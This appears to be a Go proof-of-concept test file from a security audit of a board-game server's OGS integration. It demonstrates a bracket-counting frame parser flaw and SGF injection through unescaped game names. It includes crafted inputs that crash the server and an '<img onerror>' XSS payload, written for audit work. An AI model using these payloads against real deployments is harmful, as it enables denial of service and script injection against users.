//go:build poc

// PoCs for NEW findings (integrations audit) — not part of the repo test suite.
// Run: go test -tags poc -run TestNIN -v ./pkg/room/plugin/
package plugin

import (
	"encoding/json"
	"strings"
	"testing"
	"time"

	"github.com/golab/board/pkg/state"
)

// ---------------------------------------------------------------------------
// N-IN: readFrameFromChan counts '[' and ']' bytes inside JSON strings.
// A gamedata frame whose game_name contains '[' never terminates -> the OGS
// loop goroutine stalls forever, buffering every subsequent byte (unbounded
// growth) and never processing game-over. A name with ']' terminates the
// frame EARLY -> json.Unmarshal fails or "invalid starting byte" kills the
// connector loop outright.
// ---------------------------------------------------------------------------

// feed writes s into the channel byte-wise (as readSocketToChan does) and closes it.
func feed(s string) chan byte {
	ch := make(chan byte, len(s))
	for i := 0; i < len(s); i++ {
		ch <- s[i]
	}
	return ch
}

func TestNINFrameParserBracketsInStrings(t *testing.T) {
	// 1. '[' inside a JSON string: frame never terminates; the NEXT frame's
	// bytes are swallowed into the same buffer.
	bad1 := `["game/123/gamedata", {"game_name": "[[[", "width": 19}]`
	next := `["game/123/move", {"move": [3, 4]}]`
	ch := feed(bad1 + next)
	done := make(chan []byte, 1)
	go func() {
		d, _ := readFrameFromChan(ch)
		done <- d
	}()
	// Give it 500ms: a correct parser returns bad1 alone almost immediately.
	select {
	case d := <-done:
		t.Logf("N-IN frame-parse CONFIRMED: did NOT split frames; swallowed %d bytes (wanted %d): %.60s...",
			len(d), len(bad1), string(d))
		// note: it only returns at all here because we closed the channel
	case <-time.After(500 * time.Millisecond):
		t.Logf("N-IN frame-parse CONFIRMED: readFrameFromChan NEVER RETURNED for a frame with '[' in a string;")
		t.Logf("    the OGS loop goroutine is now permanently stuck, buffering all future bytes (unbounded growth).")
	}

	// 2. ']' inside a JSON string: frame terminates EARLY (mid-JSON).
	bad2 := `["game/123/gamedata", {"game_name": "]]", "width": 19}]`
	ch2 := feed(bad2)
	d2, err2 := readFrameFromChan(ch2)
	t.Logf("']' in string -> early return after %d of %d bytes (err=%v): %q", len(d2), len(bad2), err2, string(d2))
	if len(d2) < len(bad2) {
		t.Logf("N-IN frame-parse CONFIRMED: frame cut short; the leftover bytes fail to parse ('invalid starting byte')")
		t.Logf("    -> loop() breaks -> connector silently dies (integration DoS).")
	}

	// control: a clean frame parses fine and returns exactly the frame.
	good := `["game/123/gamedata", {"game_name": "honest game", "width": 19}]`
	ch3 := feed(good)
	d3, err3 := readFrameFromChan(ch3)
	if err3 != nil || string(d3) != good {
		t.Fatalf("control failed: %v %q", err3, string(d3))
	}
	t.Logf("control OK: clean frame returned intact (%d bytes)", len(d3))
}

// ---------------------------------------------------------------------------
// N-IN: SGF injection via unescaped OGS game metadata (gameInfoToSGF splices
// game_name / usernames / rules into SGF with %s and no escaping). An OGS
// game named  x]TR[]  injects an empty TR mark -> the room commits the state
// and GenerateFullFrame nil-derefs INSIDE the OGS loop goroutine (unrecovered
// -> whole-server crash), and the poison persists. A name like
// x]LB[aa:<img ...>] injects a stored-XSS label rendered by every viewer.
// ---------------------------------------------------------------------------

func wellFormed() map[string]any {
	return map[string]any{
		"width":     19.0,
		"komi":      6.5,
		"game_name": "honest",
		"rules":     "japanese",
		"players": map[string]any{
			"black": map[string]any{"username": "b", "rank": 30.0},
			"white": map[string]any{"username": "w", "rank": 30.0},
		},
		"initial_player": "black",
		"initial_state":  map[string]any{"black": "", "white": ""},
		"moves":          []any{[]any{3.0, 3.0}},
	}
}

func TestNINSGFInjection(t *testing.T) {
	// --- poison-pill injection: empty TR mark -----------------------------
	// gameInfoToSGF's template supplies the final ']' after GN, so a name of
	// "x]TR[" produces ...GN[x]TR[];B[dd]) — a valid SGF containing TR[].
	g := wellFormed()
	g["game_name"] = "x]TR[" // free-text OGS game name; no HTML chars needed
	sgf := (&OGSConnector{}).gamedataToSGF(g)
	t.Logf("generated SGF: %s", sgf)
	if !strings.Contains(sgf, "TR[]") {
		t.Fatalf("injection did not land")
	}
	s, err := state.FromSGF(sgf)
	if err != nil {
		t.Fatalf("FromSGF rejected the injected SGF (unexpected): %v", err)
	}
	t.Logf("FromSGF ACCEPTED the injected TR[] mark (state would be committed+persisted)")
	func() {
		defer func() {
			if r := recover(); r != nil {
				t.Logf("N-IN SGF-injection CONFIRMED: GenerateFullFrame PANIC: %v", r)
				t.Logf("    in production this runs inside `go o.loop(...)` => unrecovered => whole-server crash")
			}
		}()
		_ = s.GenerateFullFrame(state.Full)
		t.Logf("no panic (unexpected)")
	}()

	// --- stored-XSS label injection ---------------------------------------
	// name + template ']' -> GN[x]LB[aa:<payload>] — valid SGF, label stored.
	g2 := wellFormed()
	g2["game_name"] = "x]LB[aa:<img src=x onerror=alert(document.domain)>"
	sgf2 := (&OGSConnector{}).gamedataToSGF(g2)
	s2, err := state.FromSGF(sgf2)
	if err != nil {
		t.Fatalf("FromSGF rejected label injection: %v", err)
	}
	frame := s2.GenerateFullFrame(state.Full)
	jb, _ := json.Marshal(frame)
	fs := string(jb)
	if strings.Contains(fs, "onerror") {
		t.Logf("N-IN SGF-injection CONFIRMED: injected LB label with XSS payload survives parse+render:")
		t.Logf("    label text reaches the frame verbatim -> frontend innerHTML sink (XSS-1) in every viewer")
	} else {
		t.Fatalf("label payload not found in frame")
	}

	// control: honest name
	g0 := wellFormed()
	sgf0 := (&OGSConnector{}).gamedataToSGF(g0)
	if _, err := state.FromSGF(sgf0); err != nil {
		t.Fatalf("control failed: %v", err)
	}
	t.Logf("control OK: honest gamedata converts+parses cleanly")
}
